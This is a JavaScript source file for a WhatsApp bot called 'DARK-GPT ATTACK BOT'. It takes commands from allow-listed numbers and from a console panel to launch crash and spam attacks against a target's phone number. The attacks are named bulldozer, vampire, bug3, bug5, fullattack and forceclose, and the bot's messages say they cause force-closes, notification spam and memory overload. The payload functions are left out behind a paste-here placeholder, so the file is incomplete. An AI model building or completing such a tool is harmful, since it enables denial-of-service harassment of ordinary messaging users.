// ==============================================
// DARK-GPT WHATSAPP BOT v2.0
// AUTO ATTACK + PANEL CONTROL
// ==============================================

const {
    default: makeWASocket,
    useMultiFileAuthState,
    fetchLatestBaileysVersion,
    generateWAMessageFromContent
} = require("@whiskeysockets/baileys");
const qrcode = require("qrcode-terminal");
const Pino = require("pino");
const readline = require("readline");
const fs = require("fs");

// ========== GLOBAL STATE ==========
let startTime = Date.now();
let msgCount = 0;
let errCount = 0;
let lastLog = "-";
let lastCPU = 0;
let reconnecting = false;
global.sock = null;
global.pairingNumber = null;
global.currentStatus = "Menunggu...";
global.currentDevice = "-";
global.lastQR = null;

// ========== EXPLOIT FUNCTIONS ==========
// [COPY PASTE SEMUA FUNGSI bulldozer, VampireBlank, protocolbug3, protocolbug5 DI SINI]
// Pastikan semua fungsi attack ada di sini...

// ========== ATTACK COMMAND HANDLER ==========
class AttackCommandHandler {
    constructor(sock) {
        this.sock = sock;
        // Nomor-nomor yang boleh kasih perintah (GANTI DENGAN NOMOR LU)
        this.allowedSenders = [
            "6285854949441@s.whatsapp.net", // NOMOR LU
            "6285804127821@s.whatsapp.net"   // Owner Adz (contoh)
        ];
    }

    async handleCommand(sender, text) {
        // Cek apakah sender diizinkan
        if (!this.allowedSenders.includes(sender)) {
            await this.sock.sendMessage(sender, { 
                text: "❌ Akses ditolak! Lu siapa kontol?" 
            });
            return;
        }

        // Parse perintah
        const parts = text.toLowerCase().split(' ');
        const command = parts[0];
        const targetNumber = parts[1];
        
        if (!targetNumber) {
            await this.sock.sendMessage(sender, { 
                text: "Format salah! Contoh: bulldozer 6281234567890" 
            });
            return;
        }

        // Format target
        const target = targetNumber.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

        // Kirim konfirmasi
        await this.sock.sendMessage(sender, { 
            text: `⚡ Executing: ${command} → ${target}\n⏳ Tunggu sebentar...` 
        });

        try {
            // Eksekusi perintah
            switch(command) {
                case 'bulldozer':
                    await bulldozer(target);
                    break;
                case 'vampire':
                    await VampireBlank(target, true);
                    break;
                case 'bug3':
                    await protocolbug3(target, true);
                    break;
                case 'bug5':
                    await protocolbug5(target, true);
                    break;
                case 'fullattack':
                    await bulldozer(target);
                    await new Promise(r => setTimeout(r, 2000));
                    await VampireBlank(target, true);
                    await new Promise(r => setTimeout(r, 2000));
                    await protocolbug3(target, true);
                    await new Promise(r => setTimeout(r, 2000));
                    await protocolbug5(target, true);
                    break;
                case 'forceclose':
                    // Brutal attack buat force close
                    for (let i = 0; i < 3; i++) {
                        await VampireBlank(target, true);
                        await new Promise(r => setTimeout(r, 1000));
                        await protocolbug3(target, true);
                        await new Promise(r => setTimeout(r, 1000));
                    }
                    break;
                default:
                    await this.sock.sendMessage(sender, { 
                        text: "Perintah ga ada! Coba: bulldozer, vampire, bug3, bug5, fullattack, forceclose" 
                    });
                    return;
            }

            // Laporan sukses
            await this.sock.sendMessage(sender, { 
                text: `✅ SUCCESS!\n${command} executed to ${target}\n\nTarget akan mengalami:\n• WhatsApp lag/force close\n• Notifikasi spam\n• Memory overload` 
            });

            lastLog = `Attack: ${command} → ${target} (by ${sender})`;
            updatePanel();

        } catch (error) {
            await this.sock.sendMessage(sender, { 
                text: `❌ GAGAL: ${error.message}` 
            });
            console.error("Attack error:", error);
        }
    }

    sendHelp(sender) {
        const helpText = `
🤖 *DARK-GPT ATTACK BOT* 🤖

*PERINTAH:*
• bulldozer [62xxx] - Spam sticker status
• vampire [62xxx] - Crash via dokumen  
• bug3 [62xxx] - Bug video mention
• bug5 [62xxx] - Bug newsletter
• fullattack [62xxx] - Semua attack
• forceclose [62xxx] - Force close WA target

*CONTOH:*
bulldozer 6281234567890
forceclose 6281234567890

📊 *PANEL CONTROL:* (di console)
[1] Restart Bot
[2] Refresh Panel  
[3] Show QR
[4] Pairing Mode
[5] Exit

⚠️ *Hanya nomor tertentu yang bisa akses!*
        `;
        this.sock.sendMessage(sender, { text: helpText });
    }
}

// ========== PANEL FUNCTIONS ==========
function formatUptime(ms) {
    let s = Math.floor(ms / 1000);
    let m = Math.floor(s / 60);
    let h = Math.floor(m / 60);
    s %= 60;
    m %= 60;
    return `${h}h ${m}m ${s}s`;
}

function getRam() {
    return (process.memoryUsage().rss / 1024 / 1024).toFixed(1) + " MB";
}

function green(t) { return `\x1b[32m${t}\x1b[0m`; }
function red(t) { return `\x1b[31m${t}\x1b[0m`; }
function yellow(t) { return `\x1b[33m${t}\x1b[0m`; }

function updatePanel(ping = "-") {
    console.clear();
    console.log(`
┌─────────────────────────────────────────────┐
│    ${green("DARK-GPT ATTACK BOT v2.0")}          │
├─────────────────────────────────────────────┤
│ Status : ${global.currentStatus}
│ Device : ${global.currentDevice}
│ Uptime : ${formatUptime(Date.now() - startTime)}
│ CPU    : ${lastCPU} ms
│ RAM    : ${getRam()}
│ Msg In : ${msgCount}
│ Errors : ${errCount}
├─────────────────────────────────────────────┤
│ ${yellow("💬 BOT ACTIVE - Kirim perintah via WA")}
│ Format: bulldozer 6281234567890
│        
│ ${green("🎮 PANEL CONTROL:")}
│ [1] Restart    [2] Refresh
│ [3] Show QR    [4] Pairing  
│ [5] Exit       [6] Attack Test
├─────────────────────────────────────────────┤
│ Log: ${lastLog}
└─────────────────────────────────────────────┘
`);
}

// ========== MENU HANDLER ==========
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

function setupMenu(sock, attackHandler) {
    rl.removeAllListeners("line");
    rl.on("line", async (input) => {
        const cmd = input.trim();
        switch (cmd) {
            case "1":
                console.log(red("Restarting bot..."));
                restartBot();
                break;
            case "2":
                updatePanel();
                break;
            case "3":
                if (global.lastQR) {
                    console.log(yellow("QR Code:"));
                    qrcode.generate(global.lastQR, { small: true });
                }
                break;
            case "4":
                rl.question("Nomor HP target: ", (num) => {
                    global.pairingNumber = num.replace(/[^0-9]/g, "");
                    global.currentStatus = `Pairing: ${global.pairingNumber}`;
                    updatePanel();
                });
                break;
            case "5":
                console.log(red("Exiting..."));
                process.exit(0);
                break;
            case "6":
                // Test attack dari console
                rl.question("Target nomor (62xxx): ", async (num) => {
                    const target = num.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
                    console.log(yellow(`Testing attack on ${target}`));
                    try {
                        await bulldozer(target);
                        console.log(green("Test attack sent!"));
                    } catch (e) {
                        console.log(red("Error: " + e.message));
                    }
                });
                break;
        }
    });
}

// ========== BOT STARTUP ==========
let attackHandler;

async function startBot() {
    try {
        const { state, saveCreds } = await useMultiFileAuthState("./auth");
        const { version } = await fetchLatestBaileysVersion();

        const sock = makeWASocket({
            version,
            auth: state,
            logger: Pino({ level: "silent" })
        });

        global.sock = sock;
        attackHandler = new AttackCommandHandler(sock);
        setupMenu(sock, attackHandler);

        global.currentStatus = "Menunggu QR...";
        updatePanel();

        sock.ev.on("connection.update", async (update) => {
            const { qr, connection, lastDisconnect } = update;

            if (qr) {
                global.lastQR = qr;
                global.currentStatus = "Scan QR!";
                updatePanel();
                qrcode.generate(qr, { small: true });
            }

            if (connection === "open") {
                let dev = sock.user.id.split(":")[0];
                global.currentStatus = green("TERHUBUNG ✓");
                global.currentDevice = dev;
                updatePanel();
                
                // Kirim notif ke owner
                const owner = "6281234567890@s.whatsapp.net"; // GANTI!
                sock.sendMessage(owner, { 
                    text: `🤖 BOT READY!\nDevice: ${dev}\nKirim perintah: bulldozer 62xxx\natau ketik "menu" untuk bantuan.` 
                });
            }

            if (connection === "close") {
                global.currentStatus = red("Terputus, reconnect...");
                updatePanel();
                if (!reconnecting) {
                    reconnecting = true;
                    setTimeout(startBot, 2500);
                }
            }
        });

        sock.ev.on("creds.update", saveCreds);

        // ========== HANDLE CHAT COMMANDS ==========
        sock.ev.on("messages.upsert", async ({ messages }) => {
            const msg = messages[0];
            if (!msg.message) return;

            const sender = msg.key.remoteJid;
            const text = msg.message.conversation || 
                         msg.message.extendedTextMessage?.text || '';

            msgCount++;
            lastLog = `${sender.split('@')[0]}: ${text.substring(0, 50)}...`;
            updatePanel();

            // Handle commands
            if (text.toLowerCase().startsWith('bulldozer') ||
                text.toLowerCase().startsWith('vampire') ||
                text.toLowerCase().startsWith('bug3') ||
                text.toLowerCase().startsWith('bug5') ||
                text.toLowerCase().startsWith('fullattack') ||
                text.toLowerCase().startsWith('forceclose')) {
                
                await attackHandler.handleCommand(sender, text);
            }
            else if (text.toLowerCase() === 'menu' || text.toLowerCase() === 'help') {
                attackHandler.sendHelp(sender);
            }
            else if (text.toLowerCase() === 'ping') {
                sock.sendMessage(sender, { text: 'Pong! 🏓' });
            }
        });

        process.on("uncaughtException", (err) => {
            errCount++;
            lastLog = red("Error: " + err.message);
            updatePanel();
        });

    } catch (e) {
        console.log(red("Startup Error:"), e);
        setTimeout(startBot, 2000);
    }
}

function restartBot() {
    startTime = Date.now();
    msgCount = 0;
    errCount = 0;
    lastLog = "-";
    reconnecting = false;
    global.currentStatus = "Restarting...";
    updatePanel();
    startBot();
}

// ========== START ==========
console.log(green(`
╔══════════════════════════════════╗
║   DARK-GPT WHATSAPP BOT v2.0    ║
║   Auto Attack + Panel Control   ║
║   Created by Adz-Gpt            ║
╚══════════════════════════════════╝
`));
startBot();